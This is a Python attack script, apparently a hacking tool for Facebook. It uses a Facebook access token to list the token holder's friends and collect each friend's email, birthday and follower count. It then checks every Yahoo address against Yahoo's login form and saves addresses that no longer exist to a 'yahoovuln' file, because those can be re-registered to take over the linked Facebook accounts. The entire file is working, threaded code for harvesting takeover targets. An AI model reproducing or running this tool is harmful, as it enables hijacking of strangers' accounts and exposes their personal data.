#!usr/bin/python3.7
#Author: DulLah ©2019
#contact: fb.me/dulahz
#github: github.com/dz-id

import os, sys, time, requests, mechanize, json
from multiprocessing.pool import ThreadPool

br=mechanize.Browser()
br.set_handle_gzip(True)
br.set_handle_redirect(True) 
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', open('UserAgent/ua.txt').read())]

global W, G, R
if sys.platform in ['linux','linux2']:
	W = '\033[0m'
	G = '\033[1;92m'
	R = '\033[1;91m'
else:
	W = ''
	G = ''
	R = ''

class Yahoo:
	def __init__ (self):
		self.token = open('log/token').read()
		self.HD = {'User-Agent' : open('UserAgent/ua.txt').read()}
		self.id = []
		self.Main()
		
	def Execute(self,id):
		try:
			
			r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + self.token,headers = self.HD)
			a = json.loads(r.text)
			
			if '@yahoo.com' in str(a['email']):
				br.open('https://login.yahoo.com/')
				br._factory.is_html=True
				br.select_form(nr=0)
				br['username'] = a['email']
				log=br.submit().read()
				
				if "messages.ERROR_INVALID_USERNAME" in str(log):
					b = requests.get('https://graph.facebook.com/' + id + '/subscribers?access_token=' + self.token,headers = self.HD)
					c = json.loads(b.text)
					
					fil = open('result/yahoovuln.txt','a')
					fil.write(a['email']+'\n')
					fil.close()
					
					print(W + '-'*45)
					print(W + '[' + G + '•' + W +'] ID        : ' + G + a['id'])
					print(W + '[' + G + '•' + W +'] Name      : ' + G + a['name'])
					print(W + '[' + G + '•' + W +'] Email     : ' + G + a['email'])
					
					try:
						print(W + '[' + G + '•' + W +'] Birthday  : ' + G + a['birthday'].replace('/','-'))
					except KeyError: print(W + '[' + G + '•' + W +'] Birthday  : ' + R + 'not found!')
					
					print(W + '[' + G + '•' + W +'] Followers : ' + G + str(c['summary']['total_count']))
					print(W + '[' + G + '•' + W +'] Status    : ' + G + 'vuln')
					print(W + '-'*45)
		
		except: pass
	
	def Threads(self):
		try:
			
			threads = int(input(W + '\n[' + G + '?' + W + '] threads 1-10 : ' + G))
			if threads >10:
				print(W + '[' + R + '!' + W + '] ' + R + 'exceeds the limit!')
				self.Threads()
				
		except ValueError:
			print(W + '[' + R + '!' + W + '] ' + R + 'enter the numbers!')
			self.Threads()
		
		m = ThreadPool(threads)
		m.map(self.Execute,self.id)
		print(W +'\n[' + G + '•' + W + '] done!')
		print(W +'[' + G + '#' + W + '] yahoo vuln saved : ' + G + 'result/yahoovuln.txt')
		
	def Main(self):
		try:
			
			r = requests.get('https://graph.facebook.com/me/friends?access_token=' + self.token,headers = self.HD)
			a = json.loads(r.text)
			
			for result in a['data']:
				self.id.append(result['id'])
				print(W + '\r[' + G + '*' + W + '] [' + R + str(len(self.id)) + W + '] GET Id... ',end='');sys.stdout.flush();time.sleep(0.002)
			
			if len(self.id) == 0:
				print(W + '[' + R + '!' + W + '] ' + R + 'no user id found!')
				sys.exit()
			else:
				#//
				self.Threads()
		except KeyError:
			print(W + '[' + R + '!' + W + '] ' + R + 'error when grabbing id!')
			print(W + '[' + R + '!' + W + '] ' + R + 'stopped!')
			sys.exit()
			
		except requests.exceptions.ConnectionError:
			print(W + '[' + R + '!' + W + '] ' + R + 'connections error!')
			print(W + '[' + R + '!' + W + '] ' + R + 'stopped!')
			sys.exit()
try:
	os.mkdir('result')
except :pass
try:
	print()
	Yahoo()
except KeyboardInterrupt:
	print(W + '\n[' + R + '!' + W + '] ' + R + 'Key interrupt!')
	print(W + '[' + R + '!' + W + '] ' + R + 'stopped!')
	sys.exit()